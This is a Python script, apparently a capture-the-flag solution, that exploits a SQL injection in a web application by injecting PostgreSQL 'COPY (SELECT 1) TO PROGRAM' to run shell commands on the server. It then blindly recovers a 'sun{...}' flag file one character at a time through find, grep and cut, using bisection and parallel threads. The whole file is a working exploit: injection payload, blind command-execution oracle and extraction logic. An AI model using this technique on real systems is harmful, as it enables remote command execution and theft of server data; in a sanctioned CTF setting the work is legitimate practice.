#!/usr/bin/env python
"""Final read: pin WHICH flag file, then read every position in parallel.

Two things this fixes over the earlier passes:
  * my own /tmp scratch from an older, buggier extractor also matches `grep -l sun{`, so it has
    to be filtered out -- otherwise `head -1` sometimes returns a file this script wrote itself;
  * `find`'s order is not stable, so the file is chosen by sorting the candidate list and taking
    a fixed slot (nth=1, nth=2 ...), and each position is read twice.

Because `cut -c<k>` isolates one byte per request, positions are independent: the whole string
is recovered in parallel, and case comes from the pair (case-insensitive match, case-sensitive
match) -- needed because the app lower-cases the payload, so `[y]` is the only thing I can type
for either `y` or `Y`.
"""
import string
import sys
import threading

import extract as E

BASE = ('find / -name "*flag*" -type f -exec grep -ls sun{ {} + 2>/dev/null '
        '| grep -v /tmp/ | sort')
CANDS = list("{}" + string.digits + string.ascii_lowercase + "_-.@!+~")


def find(nth=1):
    return "%s | sed -n %dp | xargs grep -aoE \"sun[{][^}]*[}]\" | head -1" % (BASE, nth)


def klass(chars):
    body = "".join(c for c in chars if c != "-")
    return "[" + body + ("-" if "-" in chars else "") + "]"


def ask(cmd):
    payload = "MARS'; COPY (SELECT 1) TO PROGRAM '%s'; SELECT 1; -- " % cmd
    for _ in range(3):
        if E.ask(payload):
            return True
    return False


def at(fx, k, chars, ic=False):
    return ask("%s | cut -c%d | grep -q%sE \"%s\"" % (fx, k, "i" if ic else "", klass(chars)))


def present(fx, k):
    return ask("%s | cut -c%d | grep -q ." % (fx, k))


def char_at(fx, k):
    if at(fx, k, CANDS):
        return _bisect(fx, k, CANDS, False)
    if at(fx, k, CANDS, True):
        c = _bisect(fx, k, CANDS, True)
        return c.upper() if c and c.isalpha() else "?"
    return "?"


def _bisect(fx, k, cands, ic):
    lo, hi = 0, len(cands) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        if at(fx, k, cands[lo:mid + 1], ic):
            hi = mid
        else:
            lo = mid + 1
    return cands[lo] if at(fx, k, [cands[lo]], ic) else "?"


def length(fx, cap=80):
    lo, hi = 0, cap
    while lo < hi:
        mid = (lo + hi) // 2
        if present(fx, mid + 1):
            lo = mid + 1
        else:
            hi = mid
    return lo


def read(nth=1, workers=10, positions=None):
    fx = find(nth)
    n = length(fx)
    print("[*] file #%d: %d characters" % (nth, n), flush=True)
    todo = positions or range(1, n + 1)
    vals = {}
    lock = threading.Lock()

    def w(k):
        a = char_at(fx, k)
        b = char_at(fx, k)
        c = a if a == b else (a if at(fx, k, [a.lower()], a != a.lower()) else b)
        with lock:
            vals[k] = c
        print("   %-40s pos=%2d %r%s (%d calls)"
              % ("".join(vals.get(i, "?") for i in sorted(vals)), k, c,
                 "" if a == b else "  <- unstable (%r/%r)" % (a, b), E.CALL[0]), flush=True)
    items = list(todo)
    for i in range(0, len(items), workers):
        ts = [threading.Thread(target=w, args=(k,), daemon=True) for k in items[i:i + workers]]
        for t in ts:
            t.start()
        for t in ts:
            t.join(900)
    return "".join(vals.get(k, "?") for k in sorted(vals))


if __name__ == "__main__":
    a = read(1)
    print("[+] file#1 = %s" % a, flush=True)
    b = read(2)
    print("[+] file#2 = %s" % b, flush=True)
    print("[*] identical:", a == b and "?" not in a + b, flush=True)
    if "?" not in a and a.startswith("sun{") and a.endswith("}"):
        open("flag.txt", "w").write(a.strip() + "\n")
        print("[*] saved file#1 to flag.txt", flush=True)
